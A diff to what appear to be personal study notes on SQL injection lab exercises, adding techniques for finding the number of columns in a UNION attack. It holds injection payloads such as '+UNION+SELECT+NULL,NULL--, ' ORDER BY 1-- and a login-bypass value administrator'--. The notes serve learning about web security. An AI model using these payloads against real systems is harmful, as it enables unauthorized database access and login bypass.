@@ -21,8 +21,17 @@ modify the username parameter and giving it the value: administrator'-- 	|| this
 		 
 	
 	- SQL injection UNION attack (determining the number of columns returned by the query)
-	
-		return null values datab using this '+UNION+SELECT+NULL,NULL--    || here two columns are exist.. NULL can be 1,2,3 or more   
+		this attacks can be performed by two techniques: 
+
+			1. union select null 
+			2. order by 1, 2, 3
+
+		return null values datab using this '+UNION+SELECT+NULL--    	  || here two columns are exist.. NULL can be 1,2,3 or more   
+		return null values datab using this '+UNION+SELECT+NULL,NULL--    || here two columns are exist.. NULL can be 1,2,3 or more 
+
+			' ORDER BY 1--
+			' ORDER BY 2--
+			' ORDER BY 3--
 		
 		
 	- SQL injection UNION attack (finding a column containing text)
